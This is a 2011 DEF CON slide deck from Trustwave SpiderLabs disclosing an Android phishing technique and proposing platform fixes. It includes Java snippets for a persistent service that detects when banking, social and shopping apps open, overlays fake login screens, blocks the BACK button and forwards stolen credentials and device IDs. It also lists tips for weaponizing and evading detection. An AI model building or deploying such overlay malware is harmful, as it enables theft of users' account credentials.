### DEF CON 19: This is REALLY not the Droid you’re looking for…

**Presenters:**
- Nicholas J. Percoco – Head of SpiderLabs at Trustwave
- Sean Schulte – SSL Team at Trustwave

**Copyright Trustwave 2011**

---

### Agenda
1. Introductions
2. Primer / History: Android Platform Development
3. Mobile User Interface DOs and DON’Ts
4. Research Motivations
5. Research Implications
6. Demo
7. How it Works: Technical Deep Dive
8. Conclusions

---

### Introductions

**Who are we?**
- **Nicholas J. Percoco (c7five)**
  - Head of SpiderLabs at Trustwave
  - Began his InfoSec career in the 1990s
- **Sean Schulte (sirsean)**
  - Member of the SSL Team at Trustwave
  - Backend Developer (Java & Ruby)

**What’s this talk about?**
- **Last Year's Talk (Part I):**
  - Focused on a Kernel Level Rootkit for the Android OS
  - Raised awareness about the risks and implications
  - Did not cover userland issues
- **This Year's Talk (Part II):**
  - 100% focus on the userland
  - Explored "tricks" using available APIs
  - Investigated what Google allows developers to do
  - Discovered a Layer-7 "0day" vulnerability

---

### Primer / History: Android Platform Development

**What is the Android OS?**
- A software stack for mobile devices, including an operating system, middleware, and key applications.
- Applications are Java-based and run on the Dalvik VM.
- Middleware consists of C libraries such as SQLite, OpenGL, and WebKit.
- The kernel is based on Linux.

**How has Android evolved?**
- **Donut / Éclair:**
  - Revamped UI with slide-from-right animation between applications.
- **Froyo:**
  - Performance improvements, Wi-Fi tethering, and Flash support.
- **Gingerbread:**
  - Refined UI, but with little carrier cooperation and limited uptake.
- **Honeycomb:**
  - Closed-source, tablet-only version.

**How does Google release Android updates?**
- Closed development inside Google.
- Source code released at or after binary release.
- Stock Android installed on "Google Experience" devices (e.g., Nexus One, Nexus S, G2).
- Carriers and OEMs add customization layers, leading to lengthy update delays.
- New agreement for 18 months of carrier support, but effectiveness is yet to be seen.

**What is the Android Market?**
- An online software store owned by Google.
- Accessible via the Android Market app or website.
- Over 200,000 apps available for download.
- Google does not review submitted apps but can remove bad ones from the market and users' devices.

**Android Development Terms:**
- **Activities:** Basic unit of Android apps, representing user-facing screens.
- **Intents:** Bundles of data that apps can respond to.
- **Services:** Long-running processes without a UI.
- **Notifications:** Standardized way to get the user's attention, appearing in the top left corner of the screen.

---

### Mobile User Interface DOs and DON’Ts

**Three areas of focus:**
1. **Simplicity:**
   - Each Activity should have a focused purpose.
   - The purpose should be immediately apparent.
2. **Consistency:**
   - Reuse Activities from other apps to provide familiar functionality.
   - Do not override the BACK button, as per Google's advice.
3. **Getting User’s Attention:**
   - Use Notifications.
   - Never display an Activity that the user did not request.

---

### Research Motivations

- Initially a side effect of other research (see: "Getting SSLizzard").
- Most security research focuses on "breaking" (INPUT = MALICIOUS then OUTPUT = BAD).
- Our approach: "building" using good tools (INPUT = GOOD then OUTPUT = BAD).
- Mobile often sacrifices security for screen size.
- We explored how far we could push the user.

---

### Research Implications

- An attacker builds an app using approved APIs.
- Submits the app to a public app market.
- The app is approved and available for download.
- The user downloads the app.
- The app steals credentials from popular apps (banking, social networking, shopping, VPN, etc.).
- Users do not suspect issues with their devices.

---

### Demo

- **What you’ll see:**
  - We will demonstrate "Bantha Pudu."
  - We will use some popular apps.
  - Credentials will be stolen and sent to a remote server.
  - "Bantha Pudu" will be submitted to the Android Market.
  - It will be modified to prevent actual credential uploads.
  - You can download and try it out.

---

### How it Works: Technical Deep Dive

1. **Register a Service:**
2. **Keep the Service Running:**
   - Even through a reboot.
   ```java
   public void onReceive(Context context, Intent intent) {
       if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
           Intent serviceIntent = new Intent("org.android.ImportantSystemService");
           context.startService(serviceIntent);
       }
   }
   ```
3. **Define the App you want to attack:**
   ```java
   mVictims.put("com.android.email", EmailLogin.class);
   mVictims.put("com.facebook.katana", FacebookLogin.class);
   mVictims.put("com.amazon.mShop.android", AmazonShopLogin.class);
   mVictims.put("com.google.android.apps.googlevoice", GoogleVoiceLogin.class);
   ```
4. **Poll for Foreground Apps:**
   ```java
   mTimer.scheduleAtFixedRate(new TimerTask() {
     @Override
     public void run() {
         ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
         List<RunningAppProcessInfo> appProcesses = activityManager.getRunningAppProcesses();
         for (RunningAppProcessInfo appProcess : appProcesses) {
             if (appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                 if (mVictims.containsKey(appProcess.processName)) {
                     Intent dialogIntent = new Intent(getBaseContext(), mVictims.get(appProcess.processName));
                     dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     getApplication().startActivity(dialogIntent);
                 }
             }
         }
     }
   }, DELAY, INTERVAL);
   ```
5. **Create Activity for Each Target App:**
   - Note the use of Title Bar / No Title Bar.
   ```java
   requestWindowFeature(Window.FEATURE_CUSTOM_TITLE);
   getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE, R.layout.login_victim1_title_bar);
   requestWindowFeature(Window.FEATURE_NO_TITLE);
   ```
6. **Override the BACK Button:**
   ```java
   @Override
   public void onBackPressed() {
       moveTaskToBack(true);
   }
   ```
7. **Send Credentials to External Server:**
   - Upload using a different thread.
   ```java
   Intent serviceIntent = new Intent("org.android.intent.action.ADD_CREDENTIALS");
   serviceIntent.putExtra("appName", "Facebook");
   serviceIntent.putExtra("username", username);
   serviceIntent.putExtra("password", password);
   sendBroadcast(serviceIntent);

   @Override
   public void onReceive(Context context, Intent intent) {
       final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
       String appName = intent.getStringExtra("appName");
       if (appName != null) {
           String username = intent.getStringExtra("username");
           String password = intent.getStringExtra("password");
           sendCredentials(tm.getDeviceId(), appName, username, password);
       }
   }
   ```
8. **Request the Necessary Permissions:**
9. **Other Tips:**
   - Use `noHistory` to prevent login screens from showing up in the app switcher.
   - Adjust the soft keyboard behavior to match the target app.

---

### How to Weaponize

- Randomly show the login screen on app startup, not every time.
- Show the login screen after the user has been in the app for a while.
- Check whether the supplied credentials work; if they do, stop showing the login screen for that app.
- Use one app as a "dropper" for the malicious one.
- Allow the "Service" app to be decoupled from the parent app.

---

### Conclusions

- Approved APIs can easily create malicious apps.
- Not restricting developers from making certain UI decisions is a disaster waiting to happen.
- **What can Google do?**
  - Enforce Best Practices.
  - Restrict developers from taking over the foreground.
  - Use a specific visual animation when switching apps, different from intra-app screen changes.
  - Prevent developers from using this animation.

---

### About Trustwave’s SpiderLabs®

SpiderLabs is an elite team of ethical hackers at Trustwave, advancing the security capabilities of leading businesses and organizations worldwide.

**More Information:**
- Web: [https://www.trustwave.com/spiderlabs](https://www.trustwave.com/spiderlabs)
- Blog: [http://blog.spiderlabs.com](http://blog.spiderlabs.com)
- Twitter: [@SpiderLabs](https://twitter.com/SpiderLabs)

**Questions?**